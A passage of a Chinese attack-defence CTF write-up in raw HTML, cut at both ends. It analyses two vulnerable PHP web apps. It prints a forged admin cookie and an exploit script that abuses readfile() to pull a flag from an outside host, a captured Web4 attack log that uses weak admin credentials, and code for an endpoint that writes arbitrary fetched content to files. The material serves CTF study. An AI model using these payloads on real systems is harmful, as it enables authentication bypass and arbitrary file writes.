language_">$this</span>-&gt;otype = <span class="variable">$login</span>[<span class="string">&#x27;otype&#x27;</span>];</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;uid = <span class="variable">$login</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"></span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;otype&#x27;</span>,<span class="variable">$this</span>-&gt;otype);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以得到对登录的check如下，获得名为’denglu’的Cookie，分别检测是否存在userid，以及token的值是否为dbapp的md5的值，结合上面System类的__construct()，otype必须为3，了解思路之后就很好构造了。 再回到backupsbase()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数据备份到服务器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lukui  2017-02-17</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> [type] [description]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backupsbase</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$type</span>=<span class="title function_ invoke__">input</span>(<span class="string">&quot;tp&quot;</span>);</span><br><span class="line">       <span class="variable">$name</span>=<span class="title function_ invoke__">input</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">       <span class="variable">$sql</span>=<span class="keyword">new</span> \org\<span class="title function_ invoke__">Baksql</span>(\think<span class="title class_">\Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&quot;database&quot;</span>));</span><br><span class="line">       <span class="keyword">switch</span> (<span class="variable">$type</span>)</span><br><span class="line">       &#123;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;backup&quot;</span>: <span class="comment">//备份</span></span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">backup</span>();</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;dowonload&quot;</span>: <span class="comment">//下载</span></span><br><span class="line">         <span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">downloadFile</span>(<span class="variable">$name</span>);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;restore&quot;</span>: <span class="comment">//还原</span></span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">restore</span>(<span class="variable">$name</span>);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;del&quot;</span>: <span class="comment">//删除</span></span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">delfilename</span>(<span class="variable">$name</span>);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">default</span>: <span class="comment">//获取备份文件列表</span></span><br><span class="line">           <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;db_bak&quot;</span>,[<span class="string">&quot;list&quot;</span>=&gt;<span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">get_filelist</span>()]);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更近download：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 下载备份</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> string $fileName</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> array|mixed|string</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadFile</span>(<span class="params"><span class="variable">$fileName</span></span>) </span>&#123;</span><br><span class="line">       <span class="variable">$fileName</span>=<span class="variable">$fileName</span>;</span><br><span class="line">       <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">       <span class="title function_ invoke__">header</span>(<span class="string">&quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot;</span>);</span><br><span class="line">       <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Description: File Transfer&#x27;</span>);</span><br><span class="line">       <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">       <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$fileName</span>));</span><br><span class="line">       <span class="title function_ invoke__">readfile</span>(<span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>所以最后我们需要做出的请求是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(&#x27;http://flAgserver.top/index.php?token=&#123;token&#125;&#x27;);</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp2</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp2 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># 黑名单检测</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp2.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 请求</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&quot;denglu&quot;</span>: <span class="string">&quot;think:&#123;\&quot;otype\&quot;:\&quot;3\&quot;,\&quot;userid\&quot;:\&quot;1\&quot;,\&quot;username\&quot;:\&quot;admin\&quot;,\&quot;token\&quot;:\&quot;2b1f613841e255297fc4ca74be3a95fc\&quot;&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">f&quot;http://flAgserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tp&quot;</span>: <span class="string">&quot;dowonload&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res = exp2.request(url=ip + <span class="string">&quot;aiyx/System/backupsbase&quot;</span>, method=<span class="string">&quot;GET&quot;</span>, cookies=cookies, data=data)</span><br><span class="line">    <span class="comment"># 提交 flag</span></span><br><span class="line">    exp2.submit(res=res, pid=pid) </span><br></pre></td></tr></table></figure><p>由于这个时候这道题目通知马上要下线了，刚好Web4的一血也出了，所以跟运维的师傅商量了一下没patch了（主要是当时没时间），去看Web4了的log了，后面被平白打了两轮还是蛮亏的。</p><p>然后跳去看Web4，Web4被打的Log大概是这样的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /admin?redirect=/filemanager/edit/img?file=/homepage/photo1.jpg&amp;url=http<span class="punctuation">:</span><span class="comment">//flagserver.top/index.php?token=&#123;token&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin@admin.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin@admin.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Web4是个blog，同样有登录功能，我们先来分析一下它的登录流程，可以找一下用户名和密码，用户名在两处有提示，一个是数据库安装文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into #prefix#user (id, email, password, session_id, expires, name, type, signed_up, updated, userdata) values (<span class="number">1</span>, <span class="string">&#x27;admin@admin.com&#x27;</span>, <span class="string">&#x27;$2y$10$w9ZitMtP9WIjmYQrsE41OOJglSrAKnpUQEnxUOytum1OVMwk4aDqa&#x27;</span>, <span class="literal">null</span>, (DATETIME(<span class="string">&#x27;now&#x27;</span>)), <span class="string">&#x27;Admin User&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, (DATETIME(<span class="string">&#x27;now&#x27;</span>)), (DATETIME(<span class="string">&#x27;now&#x27;</span>)), <span class="string">&#x27;[]&#x27;</span>); </span><br></pre></td></tr></table></figure><p>还有config.php也有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email_from = <span class="string">&quot;admin@admin.com&quot;</span></span><br></pre></td></tr></table></figure><p>password就比较难搞，可以看到数据库传入的password是经过加密的。加密方式是啥我们是可以朔源的，可以看到大部分的pwd都调用了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;pwd = <span class="variable">$docEncryption</span>-&gt;<span class="title function_ invoke__">to_string</span>();</span><br></pre></td></tr></table></figure><p>跟进之后可以看到加密方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">to_string</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$tmpstr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_jxqy3</span>();</span><br><span class="line"><span class="variable">$tmpstr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tmpstr</span>,-<span class="number">35</span>).<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpstr</span>,<span class="number">0</span>,<span class="number">40</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$tmpstr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">get_jxqy3</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$tmpMS</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_shal</span>().<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_md5</span>();</span><br><span class="line"><span class="variable">$tmpNewStr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">0</span>,<span class="number">9</span>).<span class="string">&#x27;s&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">10</span>,<span class="number">9</span>).<span class="string">&#x27;h&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">20</span>,<span class="number">9</span>).<span class="string">&#x27;l&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">30</span>,<span class="number">9</span>).<span class="string">&#x27;s&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">40</span>,<span class="number">9</span>).<span class="string">&#x27;u&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">50</span>,<span class="number">9</span>).<span class="string">&#x27;n&#x27;</span>.<span class="title function_ invoke__">substr</span></span><br><span class="line">(<span class="variable">$tmpMS</span>,<span class="number">60</span>,<span class="number">9</span>).<span class="string">&#x27;y&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">70</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$tmpNewStr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,-<span class="number">36</span>).<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">36</span>);</span><br><span class="line"><span class="variable">$tmpNewStr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">70</span>);</span><br><span class="line"><span class="variable">$tmpNewStr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">14</span>).<span class="string">&#x27;j&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">14</span>,<span class="number">14</span>).<span class="string">&#x27;x&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">28</span>,<span class="number">14</span>).<span class="string">&#x27;q&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">32</span>,<span class="number">14</span>).<span class="string">&#x27;y&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">56</span>,<span class="number">14</span>).<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$tmpNewStr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>谢邀，看到这里完全劝退了，逆向手狂喜。</p><p>鉴于密码还是<a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x61;&#100;&#x6d;&#x69;&#110;&#46;&#99;&#111;&#x6d;">&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x61;&#100;&#x6d;&#x69;&#110;&#46;&#99;&#111;&#x6d;</a>，所以我更倾向于大家应该是通过弱密码解出来的，如果是手撕逆向的web手那也太强了8orz。</p><p>至于为什么知道密码是<a href="mailto:&#97;&#100;&#109;&#x69;&#110;&#64;&#97;&#100;&#x6d;&#x69;&#110;&#46;&#x63;&#111;&#109;">&#97;&#100;&#109;&#x69;&#110;&#64;&#97;&#100;&#x6d;&#x69;&#110;&#46;&#x63;&#111;&#109;</a>？因为对手的poc有带上这个data，依然舒服上车。</p><p>然后登录之后是没有修改密码功能的，所以想通过修改密码防守是不太行的。</p><p>接下来的追踪对我来说是噩梦，在当时我们就没有追踪出来，由于对这个框架整个调用流程都很陌生，都是一步步慢慢摸索的，我们再来回头看这个路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin?redirect=/filemanager/edit/img?file=/homepage/photo1.jpg&amp;url=http:<span class="comment">//flagserver.top/index.php?token=&#123;token&#125;</span></span><br></pre></td></tr></table></figure><p>当时没有具体的做框架路由分析（真的血亏，但也是真的没时间，能现场挖洞的师傅辣是真滴牛皮），当时只能根据MVC框架做个大概的分析，大概初步推测是在admin的模板下通过redirect重定向到filemanager模板的edit控制器下的img函数，通过传入file来获得一个文件并且调用file_get_contents，传入参数url进行重写文件。</p><p>于是我遇到的问题就是&#x2F;filemanager&#x2F;edit&#x2F;img的路由到底在哪里，并没有找到这个函数，以及为什么在模板下就可以重定向。于是赛后重新分析，下面正儿八经的网站框架MVC分析（由于是完全逆着分析的，我感觉部分还是有错，有什么错误的地方恳请师傅们指出，欢迎一起探讨）：</p><p>我们可以看到网站app下的文件夹目录是这样的：</p><p><img src="https://oatmeal.vip/wp-content/uploads/2021/07/image-27.png"></p><p>看上面请求的路由，其中&#x2F;admin和&#x2F;filemanager都欣然在列，所以我姑且认定这些文件夹是多用户app目录或者是模块。那下面的值怎么调用，例如admin如何请求重定向，以及&#x2F;edit&#x2F;img的调用方式是什么？</p><p>我们看一下所有模块下的结构，如下：</p><p><img src="https://oatmeal.vip/wp-content/uploads/2021/07/image-28.png"></p><p>其他暂且不表，文件夹models&#x2F;views&#x2F;handlers组成了大家熟悉的MVC架构，但是作为一个模块，&#x2F;admin又是如何传参的？这里就说不通了，于是大胆猜测，真正的路由是&#x2F;admin&#x2F;index，由于调用的是默认的控制器，所以被省略了！跟进index.php，可以看到熟悉的$redirect：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进这个参数，它在这里进入了一个check，由于存在这个参数，我们可以看一下Validator::validate做了什么：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>])</span><br><span class="line">|| <span class="keyword">empty</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>])</span><br><span class="line">|| ! <span class="title class_">Validator</span>::<span class="variable constant_">validate</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>], <span class="string">&#x27;header&#x27;</span>)</span><br><span class="line">|| ! <span class="title class_">Validator</span>::<span class="variable constant_">validate</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>], <span class="string">&#x27;localpath&#x27;</span>)</span><br><span class="line">) &#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>] = <span class="variable">$appconf</span>[<span class="string">&#x27;General&#x27;</span>][<span class="string">&#x27;login_redirect&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">... </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;header&#x27;</span>:</span><br><span class="line">    <span class="keyword">return</span> ! (<span class="keyword">bool</span>) <span class="title function_ invoke__">preg_match</span> (<span class="string">&#x27;/[\r\n]/s&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;localpath&#x27;</span>:</span><br><span class="line"><span class="variable">$filtered</span> = <span class="title function_ invoke__">filter_var</span> (<span class="variable">$value</span>, FILTER_SANITIZE_URL);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$filtered</span> !== <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">filter_var</span> (<span class="variable">$value</span>, FILTER_SANITIZE_URL);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$value</span> === <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span> (<span class="string">&#x27;|^/[^/]|&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>第一个删掉了\r\n，第二个限定了请求的重定向的目录必须是本地路径，而不是其他网站，限制了一下重定向攻击。</p><p>这里我们提交的payload为redirect&#x3D;&#x2F;filemanager&#x2F;edit&#x2F;img，即重定向到了&#x2F;filemanager下的……下的什么呢？</p><p>经验告诉我，会重定向到filemanager下的handlers下的edit.php，并且调用下面img方法，并且比赛中我就是这么认为实现的，但是进入edit.php，会发现其实并没有img()这个方法，这也是我刚开始打比赛的时候搜索全局函数没有搜到img最后也没有patch上的原因。这里的目录是这样子的：</p><p><img src="https://oatmeal.vip/wp-content/uploads/2021/07/image-29.png"></p><p>这里可以看出差别，其实我们并不是进入了edit控制器调用img函数，而是进入了edit目录下的img.php！结合上面&#x2F;admin&#x2F;index这样的路由，这样的推测其实是正确的，我们实际上只是调用了img.php，并没有调用其中的任何函数，我们跟进img.php进行check，每一步发生什么我都根据我的理解进行了注释。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Save the changes from Aviary for an image.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">require_admin</span> ();</span><br><span class="line"><span class="variable">$page</span>-&gt;layout = <span class="literal">false</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123; <span class="comment">// 是否提交了file参数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;No file specified.&#x27;</span>)</span><br><span class="line">));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="title class_">FileManager</span>::<span class="variable constant_">verify_file</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123; <span class="comment">// 验证文件是否存在</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;Invalid file.&#x27;</span>)</span><br><span class="line">));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123; <span class="comment">// 验证是否GET存在$url参数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;No image url specified.&#x27;</span>)</span><br><span class="line">));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">fetch_url</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (! <span class="variable">$res</span>) &#123; <span class="comment">// URL是否能进行正常解析</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;Updated image not found.&#x27;</span>)</span><br><span class="line">));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="title function_ invoke__">file_put_contents</span> (<span class="title function_ invoke__">conf</span>(<span class="string">&#x27;Paths&#x27;</span>,<span class="string">&#x27;filemanager_path&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>  . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>], <span class="variable">$res</span>)) &#123; <span class="comment">// 最终将url请求的参数写入文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;Unable to write to the file. Please check your folder permissions and try again.&#x27;</span>)</span><br><span class="line">));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"><span class="string">&#x27;data&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;File saved.&#x27;</span>)</span><br><span class="line">)); </span><br></pre></td></tr></table></figure><p>这样发生什么就很清楚了，从&#x2F;admin模块的index控制器重定向到&#x2F;filemanager模块下的&#x2F;edit&#x2F;img控制器并且通过了url写入文件flag，这也是为什么我刚开始请求图片文件下马获得的flag都会报错，因为我拿到的是别的队伍的token的flag。如果多个队伍同时请求一个图片文件，你甚至还需要跟他们条件竞争。</p><p>最终exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 